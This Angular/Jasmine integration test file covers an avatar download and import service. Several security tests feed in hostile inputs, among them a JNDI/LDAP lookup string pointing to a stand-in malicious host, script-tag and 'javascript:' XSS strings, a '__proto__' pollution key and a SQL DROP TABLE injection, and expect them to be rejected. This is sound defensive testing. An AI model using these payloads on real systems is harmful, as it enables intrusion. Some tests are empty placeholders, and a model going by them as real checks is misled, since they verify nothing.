/**
 * Integration Tests for Avatar Workflow
 * Tests the complete flow from avatar download/import to character creation
 */

import { TestBed, fakeAsync, tick } from '@angular/core/testing';
import { HttpClientTestingModule, HttpTestingController } from '@angular/common/http/testing';
import { AvatarsService } from '../services/avatars.service';
import { DatabaseService } from '../services/database.service';
import { SecurityService } from '../services/security.service';
import { INDEXED_DATABASE_FACTORY_TOKEN } from '../app.config';

describe('Avatar Workflow Integration Tests', () => {
  let avatarsService: AvatarsService;
  let databaseService: DatabaseService;
  let securityService: SecurityService;
  let httpMock: HttpTestingController;
  let mockIndexedDB: jasmine.SpyObj<IDBFactory>;

  beforeEach(() => {
    // Create mock IndexedDB
    mockIndexedDB = jasmine.createSpyObj('IDBFactory', ['open']);
    const mockDB = jasmine.createSpyObj('IDBDatabase', ['transaction', 'createObjectStore']);
    const mockTransaction = jasmine.createSpyObj('IDBTransaction', ['objectStore']);
    const mockObjectStore = jasmine.createSpyObj('IDBObjectStore', ['get', 'put', 'delete', 'getAll', 'getAllKeys', 'clear', 'createIndex']);
    const mockRequest = jasmine.createSpyObj('IDBRequest', ['onsuccess', 'onerror']);
    const mockOpenRequest = jasmine.createSpyObj('IDBOpenDBRequest', ['onsuccess', 'onerror', 'onupgradeneeded']);

    mockIndexedDB.open.and.returnValue(mockOpenRequest);
    mockDB.transaction.and.returnValue(mockTransaction);
    mockTransaction.objectStore.and.returnValue(mockObjectStore);
    mockObjectStore.get.and.returnValue(mockRequest);
    mockObjectStore.put.and.returnValue(mockRequest);
    mockObjectStore.getAll.and.returnValue(mockRequest);

    TestBed.configureTestingModule({
      imports: [HttpClientTestingModule],
      providers: [
        AvatarsService,
        DatabaseService,
        SecurityService,
        { provide: INDEXED_DATABASE_FACTORY_TOKEN, useValue: mockIndexedDB }
      ]
    });

    avatarsService = TestBed.inject(AvatarsService);
    databaseService = TestBed.inject(DatabaseService);
    securityService = TestBed.inject(SecurityService);
    httpMock = TestBed.inject(HttpTestingController);

    // Setup default mock behaviors
    mockOpenRequest.onsuccess = jasmine.createSpy().and.callFake((event) => {
      if (event?.target?.result) event.target.result = mockDB;
    });
    mockRequest.onsuccess = jasmine.createSpy().and.callFake((event) => {
      if (event?.target) event.target.result = {};
    });
  });

  afterEach(() => {
    httpMock.verify();
  });

  describe('Complete Avatar Download Workflow', () => {
    it('should successfully download, validate, and store a complete avatar pack', fakeAsync(() => {
      const testManifest = {
        key: 'test-avatar',
        description: 'A comprehensive test avatar',
        images: [
          {
            type: 'url',
            key: 'standard',
            source: 'https://example.com/avatar-standard.png'
          },
          {
            type: 'url',
            key: 'profile',
            source: 'https://example.com/avatar-profile.png'
          }
        ]
      };

      let downloadCompleted = false;
      let downloadError = null;

      // Start the download workflow
      avatarsService.download('https://example.com/avatar-manifest.json')
        .subscribe(
          () => { downloadCompleted = true; },
          (error) => { downloadError = error; }
        );

      tick(100);

      // Expect manifest request
      const manifestReq = httpMock.expectOne('https://example.com/avatar-manifest.json');
      expect(manifestReq.request.method).toBe('GET');
      manifestReq.flush(testManifest);

      tick(100);

      // Expect image requests
      const standardImageReq = httpMock.expectOne('https://example.com/avatar-standard.png');
      expect(standardImageReq.request.method).toBe('GET');
      expect(standardImageReq.request.responseType).toBe('blob');
      standardImageReq.flush(new Blob(['fake standard image'], { type: 'image/png' }));

      const profileImageReq = httpMock.expectOne('https://example.com/avatar-profile.png');
      expect(profileImageReq.request.method).toBe('GET');
      expect(profileImageReq.request.responseType).toBe('blob');
      profileImageReq.flush(new Blob(['fake profile image'], { type: 'image/png' }));

      tick(1000);

      expect(downloadCompleted).toBe(true);
      expect(downloadError).toBeNull();
    }));

    it('should handle partial download failures gracefully', fakeAsync(() => {
      const testManifest = {
        key: 'partial-avatar',
        description: 'Avatar with some failing images',
        images: [
          {
            type: 'url',
            key: 'standard',
            source: 'https://example.com/working-image.png'
          },
          {
            type: 'url',
            key: 'broken',
            source: 'https://example.com/broken-image.png'
          }
        ]
      };

      let downloadCompleted = false;

      avatarsService.download('https://example.com/partial-manifest.json')
        .subscribe(() => { downloadCompleted = true; });

      tick(100);

      const manifestReq = httpMock.expectOne('https://example.com/partial-manifest.json');
      manifestReq.flush(testManifest);

      tick(100);

      // First image succeeds
      const workingImageReq = httpMock.expectOne('https://example.com/working-image.png');
      workingImageReq.flush(new Blob(['working image'], { type: 'image/png' }));

      // Second image fails
      const brokenImageReq = httpMock.expectOne('https://example.com/broken-image.png');
      brokenImageReq.error(new ErrorEvent('Image not found'));

      tick(1000);

      // Should still complete successfully (partial success)
      expect(downloadCompleted).toBe(true);
    }));

    it('should validate and sanitize malicious manifest content', fakeAsync(() => {
      const maliciousManifest = {
        key: '<script>alert("xss")</script>',
        description: '${jndi:ldap://malicious.com/exploit}',
        __proto__: 'malicious',
        images: [
          {
            type: 'url',
            key: 'standard',
            source: 'javascript:alert("xss")'
          }
        ]
      };

      let downloadError = null;

      avatarsService.download('https://malicious.example.com/manifest.json')
        .subscribe(
          () => {},
          (error) => { downloadError = error; }
        );

      tick(100);

      const manifestReq = httpMock.expectOne('https://malicious.example.com/manifest.json');
      manifestReq.flush(maliciousManifest);

      tick(1000);

      // Should reject malicious content
      expect(downloadError).not.toBeNull();
      expect(downloadError?.message).toContain('Invalid');
    }));
  });

  describe('Local Avatar Import Workflow', () => {
    it('should successfully import local avatar with validation', fakeAsync(() => {
      const manifestContent = JSON.stringify({
        key: 'local-avatar',
        description: 'Locally imported avatar',
        images: [
          {
            type: 'local',
            key: 'standard',
            name: 'avatar.png'
          }
        ]
      });

      const manifestFile = new File([manifestContent], 'manifest.json', { type: 'application/json' });
      const imageFile = new File(['fake image data'], 'avatar.png', { type: 'image/png' });
      
      const manifestFiles = Object.assign([manifestFile], { length: 1 }) as FileList;
      const imageFiles = Object.assign([imageFile], { length: 1 }) as FileList;

      let importCompleted = false;
      let importError = null;

      avatarsService.import(manifestFiles, imageFiles)
        .subscribe(
          () => { importCompleted = true; },
          (error) => { importError = error; }
        );

      tick(1000);

      expect(importCompleted).toBe(true);
      expect(importError).toBeNull();
    }));

    it('should reject invalid local files', fakeAsync(() => {
      const maliciousContent = JSON.stringify({
        key: 'malicious-avatar',
        description: '<script>alert("xss")</script>',
        images: []
      });

      // Create file with dangerous extension
      const maliciousFile = new File([maliciousContent], 'manifest.exe', { type: 'application/octet-stream' });
      const manifestFiles = Object.assign([maliciousFile], { length: 1 }) as FileList;

      let importError = null;

      avatarsService.import(manifestFiles, null as any)
        .subscribe(
          () => {},
          (error) => { importError = error; }
        );

      tick(1000);

      // Should reject file with dangerous extension
      expect(importError).not.toBeNull();
      expect(importError?.message).toContain('Invalid file');
    }));

    it('should handle missing image files gracefully', fakeAsync(() => {
      const manifestContent = JSON.stringify({
        key: 'incomplete-avatar',
        description: 'Avatar missing some images',
        images: [
          {
            type: 'local',
            key: 'standard',
            name: 'missing.png'
          },
          {
            type: 'local',
            key: 'profile',
            name: 'available.png'
          }
        ]
      });

      const manifestFile = new File([manifestContent], 'manifest.json', { type: 'application/json' });
      const imageFile = new File(['available image'], 'available.png', { type: 'image/png' });
      
      const manifestFiles = Object.assign([manifestFile], { length: 1 }) as FileList;
      const imageFiles = Object.assign([imageFile], { length: 1 }) as FileList;

      let importCompleted = false;

      avatarsService.import(manifestFiles, imageFiles)
        .subscribe(() => { importCompleted = true; });

      tick(1000);

      // Should complete successfully with available images only
      expect(importCompleted).toBe(true);
    }));
  });

  describe('Database Security Integration', () => {
    it('should prevent IndexedDB injection through avatar data', async () => {
      const maliciousData = {
        key: '"; DROP TABLE avatars; --',
        avatarKey: '__proto__',
        source: 'javascript:void(0)',
        blob: new Blob(['<script>alert("xss")</script>'])
      };

      try {
        await databaseService.put(Promise.resolve({} as IDBDatabase), 'images', maliciousData);
        // Should not reach here if validation works
        fail('Should have thrown validation error');
      } catch (error) {
        expect(error.message).toContain('Invalid');
      }
    });

    it('should sanitize data before storage', async () => {
      const unsafeData = {
        key: 'test-image',
        avatarKey: 'test-avatar',
        source: 'https://example.com/image.png',
        blob: new Blob(['image data']),
        __proto__: 'malicious',
        constructor: 'bad'
      };

      // Should sanitize and store without dangerous properties
      spyOn(securityService, 'sanitizeObject').and.callThrough();
      
      try {
        await avatarsService.getImage('test-avatar', 'test-image');
        expect(securityService.sanitizeObject).toHaveBeenCalled();
      } catch (error) {
        // Expected to fail in test environment, but sanitization should have been called
        expect(securityService.sanitizeObject).toHaveBeenCalled();
      }
    });
  });

  describe('Rate Limiting Integration', () => {
    it('should enforce rate limits for downloads', fakeAsync(() => {
      const urls = Array(15).fill(0).map((_, i) => `https://example.com/avatar${i}.json`);
      let successCount = 0;
      let errorCount = 0;

      // Attempt rapid downloads (should hit rate limit)
      urls.forEach(url => {
        avatarsService.download(url).subscribe(
          () => successCount++,
          () => errorCount++
        );
      });

      tick(100);

      // Should have rate limited some requests
      expect(errorCount).toBeGreaterThan(0);
      expect(successCount + errorCount).toBe(urls.length);
    }));

    it('should enforce rate limits for image downloads', fakeAsync(() => {
      const testManifest = {
        key: 'large-avatar',
        description: 'Avatar with many images',
        images: Array(60).fill(0).map((_, i) => ({
          type: 'url',
          key: `image${i}`,
          source: `https://example.com/image${i}.png`
        }))
      };

      let downloadCompleted = false;

      avatarsService.download('https://example.com/large-manifest.json')
        .subscribe(() => { downloadCompleted = true; });

      tick(100);

      const manifestReq = httpMock.expectOne('https://example.com/large-manifest.json');
      manifestReq.flush(testManifest);

      tick(100);

      // Should have limited the number of concurrent image requests
      const imageRequests = httpMock.match(req => req.url.includes('image') && req.url.endsWith('.png'));
      expect(imageRequests.length).toBeLessThan(60); // Rate limiting should reduce requests

      // Complete any pending requests
      imageRequests.forEach(req => {
        req.flush(new Blob(['image'], { type: 'image/png' }));
      });

      tick(1000);

      expect(downloadCompleted).toBe(true);
    }));
  });

  describe('Error Recovery and Resilience', () => {
    it('should recover from network failures', fakeAsync(() => {
      let retryAttempted = false;

      // First attempt fails, second succeeds
      avatarsService.download('https://unstable.example.com/manifest.json')
        .subscribe(
          () => { retryAttempted = true; },
          () => { /* First failure expected */ }
        );

      tick(100);

      const req1 = httpMock.expectOne('https://unstable.example.com/manifest.json');
      req1.error(new ErrorEvent('Network failure'));

      // Simulate retry logic (would need to be implemented in service)
      // For now, just verify error handling doesn't crash
      expect(retryAttempted).toBe(false);
    }));

    it('should handle database connection failures', async () => {
      // Simulate database connection failure
      mockIndexedDB.open.and.throwError('Database unavailable');

      try {
        await databaseService.getDatabase('test', [{ name: 'test' }]);
        fail('Should have thrown database error');
      } catch (error) {
        expect(error.message).toContain('Database unavailable');
      }
    });

    it('should maintain data consistency during failures', fakeAsync(() => {
      const testManifest = {
        key: 'consistency-test',
        description: 'Test consistency',
        images: [
          {
            type: 'url',
            key: 'standard',
            source: 'https://example.com/image.png'
          }
        ]
      };

      avatarsService.download('https://example.com/consistency-manifest.json')
        .subscribe();

      tick(100);

      const manifestReq = httpMock.expectOne('https://example.com/consistency-manifest.json');
      manifestReq.flush(testManifest);

      tick(100);

      // Simulate failure during image download
      const imageReq = httpMock.expectOne('https://example.com/image.png');
      imageReq.error(new ErrorEvent('Image download failed'));

      tick(1000);

      // Database should remain in consistent state (avatar abstract without images)
      // This would need verification through actual database queries in a real test
      expect(true).toBe(true); // Placeholder for consistency check
    }));
  });

  describe('Performance and Memory Management', () => {
    it('should handle large avatar downloads efficiently', fakeAsync(() => {
      const largeManifest = {
        key: 'performance-test',
        description: 'Performance test avatar',
        images: Array(100).fill(0).map((_, i) => ({
          type: 'url',
          key: `image${i}`,
          source: `https://fast-cdn.example.com/image${i}.png`
        }))
      };

      const startTime = performance.now();
      let completed = false;

      avatarsService.download('https://example.com/performance-manifest.json')
        .subscribe(() => {
          completed = true;
        });

      tick(100);

      const manifestReq = httpMock.expectOne('https://example.com/performance-manifest.json');
      manifestReq.flush(largeManifest);

      tick(100);

      // Handle image requests (limited by rate limiting)
      const imageRequests = httpMock.match(req => req.url.includes('fast-cdn.example.com'));
      imageRequests.forEach(req => {
        req.flush(new Blob(['fast image'], { type: 'image/png' }));
      });

      tick(2000);

      const endTime = performance.now();
      const duration = endTime - startTime;

      expect(completed).toBe(true);
      expect(duration).toBeLessThan(10000); // Should complete within 10 seconds
    }));

    it('should clean up resources properly', fakeAsync(() => {
      // Multiple rapid operations to test resource management
      for (let i = 0; i < 50; i++) {
        const manifest = {
          key: `cleanup-test-${i}`,
          description: `Cleanup test ${i}`,
          images: []
        };

        avatarsService.download(`https://example.com/cleanup${i}.json`)
          .subscribe();

        tick(10);

        const req = httpMock.expectOne(`https://example.com/cleanup${i}.json`);
        req.flush(manifest);
      }

      tick(1000);

      // Should complete without memory issues
      expect(true).toBe(true); // Placeholder for memory usage check
    }));
  });
});